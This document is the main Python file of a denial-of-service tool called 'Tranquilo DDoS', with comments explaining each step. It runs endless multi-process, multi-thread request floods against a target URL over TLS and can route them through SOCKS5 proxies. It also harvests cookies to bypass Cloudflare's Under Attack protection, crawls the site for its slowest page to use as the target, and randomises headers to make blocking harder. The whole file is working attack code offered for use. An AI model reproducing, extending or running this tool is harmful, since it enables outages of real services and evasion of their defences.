import multiprocessing
import threading, socks, ssl, random, argparse, threading
import time
from urllib.parse import urlparse

import TranquiloCheck
import TranquiloCookie
import TranquiloCrawler
import TranquiloHeaders
import TranquiloProxy


def tranquiloLaunch(url, threads, dheaders, dusarProxy, dProxies):
    # Function responsible for starting multiple attack threads.
    # Each thread will call the tranquiloAttack function, which effectively sends the requests.
    #
    # Parameters:
    # - url (str): Target URL of the attack.
    # - threads (int): Number of threads to start in this process.
    # - dheaders (list): List of pre-generated headers for the requests.
    # - dusarProxy (bool): Indicates whether the attack will use proxies.
    # - dProxies (list): List of available proxies, if dusarProxy is True.

    for i in range(int(threads)):
        threading.Thread(target=tranquiloAttack, args=(url, dheaders, dusarProxy, dProxies)).start()


def tranquiloAttack(url, dheaders, dusarProxy, dProxies):
    # Function responsible for continuously sending requests (infinite loop).
    # Each thread will execute this function, dispatching requests to the target.
    #
    # Parameters:
    # - url (str): Target URL.
    # - dheaders (list): List of randomized headers to diversify requests.
    # - dusarProxy (bool): Indicates whether to use proxies.
    # - dProxies (list): List of proxies if dusarProxy is True.

    while True:
        # Randomly chooses a set of headers (including a formatted HTTP request).
        req = random.choice(dheaders)
        
        try:
            # Creates a socket that will be wrapped with SSL.
            # If proxies are enabled, configures the socket to use them.
            s = socks.socksocket()
            
            if dusarProxy:
                # Selects a random proxy and configures the socket to use SOCKS5.
                proxy = random.choice(dProxies).strip().split(":")
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            
            # Connects to the host on port 443 (HTTPS).
            s.connect((str(urlparse(url).netloc), 443))

            # Creates an SSL context and wraps the socket, enabling HTTPS traffic.
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)

            # Sends the initial request packet.
            s.send(req)

            # Attempts to send the request multiple times in succession to increase the load.
            # If an error occurs, the socket is closed, and the loop restarts.
            try:
                for _ in range(100):
                    s.send(req)
            except:
                 # If an error occurs during re-sending, closes the socket.
                s.close()
        except:
            # If any exception occurs (connection issues, SSL errors, etc.), closes the socket
            # and continues trying again in the next loop.
            s.close()


def pularLinhas(x=1):
    # Auxiliary function to print x blank lines in the console for better readability.
    for _ in range(x):
        print('')


if __name__ == '__main__':
    # Main block: responsible for parsing arguments, preparing the environment,
    # generating headers, configuring proxies, capturing cookies (if underAttack), and starting the attack.

    # Initial variables
    rodar = True
    cookie = None
    userAgent = None
    usarProxy = False
    
    # Command-line argument configuration, allowing script customization.
    parser = argparse.ArgumentParser(description='Tranquilo DDoS')
    
    parser.add_argument('--url', '-u', type=str, required=True, help='Target URL')
    parser.add_argument('--thread', '-t', type=int, required=True, help='Number of threads per process')
    parser.add_argument('--numHeaders', '-e', type=int, required=False, default='2500', help='Number of headers to generate')
    parser.add_argument('--underAttack', '-a', required=False, action='store_true', default=False, help='Enable Under Attack mode (e.g., Cloudflare UAM bypass)')
    parser.add_argument('--useProxy', '-p', required=False, action='store_true', default=False, help='Enable proxy usage')
    parser.add_argument('--proxyList', '-l', type=str, required=False, help='Caminho para arquivo .txt com lista de proxies')
    parser.add_argument('--useCrawler', '-c', required=False, action='store_true', default=False, help='Enable Crawler mode to identify heavier URLs on the domain')

    args = parser.parse_args()

    # Assigning variables from the arguments
    target = args.url
    thread = args.thread
    numHeaders = args.numHeaders
    underAttack = args.underAttack
    usarProxy = args.useProxy
    proxylist = args.proxyList
    usarCrawler = args.useCrawler

    pularLinhas()
    
    # Verifies if Under Attack mode and proxy usage are enabled simultaneously.
    # If so, the script is incompatible and terminates.
    if underAttack and usarProxy:
        print(" UnderAttack mode is not supported with proxy usage.")
        print(" Exiting...")
        usarProxy = False
        quit()
        
    pularLinhas()
    
    # Verifies if all required resources for the attack are available (external function).
    TranquiloCheck.verificar_resources()
    
    pularLinhas(2)
    
    # If proxy usage is enabled, loads the proxy list.
    if usarProxy:
        print(" Proxy usage - Enabled")
        # 'custom' indicates whether the user provided a custom proxy list or will use the default.
        if proxylist is not None:
            custom = True
        else:
            custom = False
        proxies = TranquiloProxy.definir_proxies(custom_list=custom, userList=proxylist)
    else:
        proxies = []
        print(" Proxy usage - Disabled")
    
    pularLinhas(2)
    
    # If Under Attack mode is enabled, tries to obtain specific cookies and user-agent
    # to bypass the target's protections.
    if underAttack:
        print(" UnderAttack Mode - Enabled")
        print(" Starting cookie collection...")
        time.sleep(1)
        cookie, userAgent = TranquiloCookie.get_cookie(url=target, user=TranquiloHeaders.random_user_agent())
    else:
        print(" UnderAttack Mode - Disabled")
    
    pularLinhas(2)
    
    # If Crawler mode is enabled, performs crawling on the target domain to find heavier URLs.
    # The slowest URL found becomes the new target, potentially more costly for the server.
    try:
        if usarCrawler:
            print(" Crawler Mode - Enabled")
            print(' Starting Crawling...')
            maiores_urls = TranquiloCrawler.iniciar_crawl(url=target, underAttack=underAttack, cookie=cookie, userAgent=userAgent)
            pularLinhas()
            print(' Crawling Completed')
            print(f'  Heaviest URL: {maiores_urls[0]["url"]}')
            print(f'  Response Time: {round(maiores_urls[0]["response_time"], 2)} seconds')
            # Redefines the target to the heaviest URL.
            target = maiores_urls[0]['url']
        else:
            print(" Crawler Mode - Disabled")
    except:
        # If the Crawler fails, continues using the originally provided URL.
        print(" Crawler error, continuing with the provided URL")
        pass
    
    pularLinhas(2)
    
    # Generates an extensive set of HTTP headers (numHeaders) to send with the requests.
    # These headers include User-Agent, cookies (if obtained), etc., to complicate blocking.
    print(' Generating Headers...')
    headers = TranquiloHeaders.carrega_Headers(url=target, num_headers=numHeaders, underAttack=underAttack, cookie=cookie, agent=userAgent)
    print(' Headers successfully generated')
    
    pularLinhas(2)
    
    # Starts the attack by distributing the process among multiple CPU cores (multiprocessing).
    # Each process will call tranquiloLaunch, which in turn starts several threads.
    print(' Starting Attack')
    quantidade_processos = multiprocessing.cpu_count()
    processos = []

    for i in range(quantidade_processos):
        p = multiprocessing.Process(target=tranquiloLaunch, args=(target, thread, headers, usarProxy, proxies))
        p.start()
        processos.append(p)

    try:
        # Keeps the program running, waiting for the processes to complete.
        # Normally, the attack continues until the user manually interrupts (Ctrl+C).
        for p in processos:
            p.join()
    except KeyboardInterrupt:
        # If the user presses Ctrl+C, tries to terminate the processes gracefully.
        for p in processos:
            p.join()
    
    pularLinhas()